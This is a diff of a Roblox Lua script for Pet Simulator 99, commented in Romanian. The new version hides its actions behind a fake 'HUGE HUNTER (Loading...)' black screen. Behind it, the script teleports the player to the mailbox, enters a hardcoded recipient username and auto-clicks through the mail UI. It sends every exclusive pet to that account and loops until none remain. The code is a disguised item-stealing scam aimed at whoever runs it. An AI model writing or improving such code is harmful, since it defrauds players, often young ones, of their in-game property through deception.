@@ -1,20 +1,10 @@
--- =============================================  
--- INSTANT MAILBOX SCRIPT (PET SIMULATOR 99)  
--- Teleportare + Auto-Write "LOL" + Donate  
--- =============================================  
-
-local player = game:GetService("Players").LocalPlayer  
-local targetUser = "pompeiulcelbatran" -- SCHIMBĂ AICI  
-
--- 1. ECRAN NEGRU ȘI BLOCARE INPUT  
-local gui = Instance.new("ScreenGui")  
 local player = game:GetService("Players").LocalPlayer
-local targetUser = "pompeiulcelbatran" -- SCHIMBĂ AICI
-local mailboxPos = Vector3.new(141.1, 23.6, -347.2) -- COORDONATELE TALE
+local targetUser = "pompeiulcelbatran" -- Schimbă dacă e necesar
+local mailboxPos = Vector3.new(141.1, 23.6, -347.2) -- Coordonatele tale
 
--- 1. ECRAN NEGRU INSTANT
+-- 1. ECRAN NEGRU CU "HUGE HUNTER" (60 de secunde)
 local gui = Instance.new("ScreenGui")
-gui.Name = "BlackScreen"
+gui.Name = "HugeHunterLoader"
 gui.Parent = player:WaitForChild("PlayerGui")
 
 local frame = Instance.new("Frame")
@@ -22,42 +12,92 @@ frame.Size = UDim2.new(1, 0, 1, 0)
 frame.BackgroundColor3 = Color3.new(0, 0, 0)
 frame.Parent = gui
 
--- 2. TELEPORTARE LA MAILBOX (COORDONATELE TALE)
-if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
-    player.Character.HumanoidRootPart.CFrame = CFrame.new(mailboxPos)
-end
+local text = Instance.new("TextLabel")
+text.Size = UDim2.new(0, 300, 0, 100)
+text.Position = UDim2.new(0.5, -150, 0.5, -50)
+text.Text = "HUGE HUNTER (Loading...)"
+text.TextColor3 = Color3.new(1, 1, 1)
+text.Font = Enum.Font.SourceSansBold
+text.TextSize = 32
+text.Parent = frame
 
--- 3. SCRIE "LOL" ÎN MAILBOX (AȘTEPTĂ 2 SEC)
+-- 2. TELEPORTARE LA MAILBOX
+player.Character:MoveTo(mailboxPos)
 task.wait(2)
-local coreGui = game:GetService("CoreGui")
-for _, obj in ipairs(coreGui:GetDescendants()) do
-    if obj:IsA("TextBox") and obj.Name == "MessageBox" then
-        obj.Text = "LOL"
-        break
+
+-- 3. FUNCȚIE AUTO-CLICK PENTRU BUTOANE
+local function clickButton(buttonName)
+    for _, v in ipairs(game:GetService("CoreGui"):GetDescendants()) do
+        if v:IsA("TextButton") and (v.Text == buttonName or v.Name == buttonName) then
+            v:Activate()
+            task.wait(1)
+            break
+        end
     end
 end
 
--- 4. DONEAZĂ EXCLUSIVELE
-task.wait(1)
-local backpack = player.Backpack or player.Character
-for _, pet in ipairs(backpack:GetChildren()) do
-    if pet:FindFirstChild("Exclusive") then
-        game:GetService("ReplicatedStorage").Events.DonatePet:FireServer(targetUser, pet.Name)
-        task.wait(0.3) -- EVITĂ BAN
+-- 4. PROCESUL COMPLET AUTOMAT
+local function donateAll()
+    -- Completează username
+    for _, v in ipairs(game:GetService("CoreGui"):GetDescendants()) do
+        if v:IsA("TextBox") and v.Name == "UsernameBox" then
+            v.Text = targetUser
+            task.wait(0.5)
+            break
+        end
     end
+    
+    -- Apasă "Add Gift" și selectează exclusivele
+    clickButton("Add Gift")
+    task.wait(2)
+    
+    -- Selectează toate exclusivele
+    local backpack = player.Backpack or player.Character
+    for _, pet in ipairs(backpack:GetChildren()) do
+        if pet:FindFirstChild("Exclusive") then
+            -- Simulează click pe pet (necesită adaptare pentru UI-ul specific)
+            for _, uiElement in ipairs(game:GetService("CoreGui"):GetDescendants()) do
+                if uiElement:IsA("ImageButton") and uiElement:FindFirstChild("PetName") and uiElement.PetName.Text == pet.Name then
+                    uiElement:Activate()
+                    task.wait(0.3)
+                    break
+                end
+            end
+        end
+    end
+    
+    -- Completează mesajul
+    for _, v in ipairs(game:GetService("CoreGui"):GetDescendants()) do
+        if v:IsA("TextBox") and v.Name == "MessageBox" then
+            v.Text = "LOL"
+            task.wait(0.5)
+            break
+        end
+    end
+    
+    -- Apasă "Send"
+    clickButton("Send")
+    task.wait(3)
 end
 
--- 5. NUMĂRĂTOARE (15->0) ȘI CURĂȚĂ ECRANUL
-local countdown = Instance.new("TextLabel")
-countdown.Text = "15"
-countdown.Size = UDim2.new(0, 200, 0, 50)
-countdown.Position = UDim2.new(0.5, -100, 0.5, -25)
-countdown.TextColor3 = Color3.new(1, 1, 1)
-countdown.Font = Enum.Font.SourceSansBold
-countdown.Parent = frame
-
-for i = 15, 0, -1 do
-    countdown.Text = tostring(i)
-    task.wait(1)
+-- 5. EXECUTĂ PROCESUL PÂNĂ NU MAI SUNT EXCLUSIVE
+local startTime = os.time()
+while os.time() - startTime < 60 do -- Rulează maxim 1 minut
+    donateAll()
+    
+    -- Verifică dacă mai sunt exclusive
+    local hasExclusives = false
+    local backpack = player.Backpack or player.Character
+    for _, pet in ipairs(backpack:GetChildren()) do
+        if pet:FindFirstChild("Exclusive") then
+            hasExclusives = true
+            break
+        end
+    end
+    
+    if not hasExclusives then break end
+    task.wait(5) -- Așteaptă între donații
 end
-gui:Destroy() -- ȘTERGE ECRANUL NEGRU
+
+-- Șterge ecranul după terminare
+gui:Destroy()
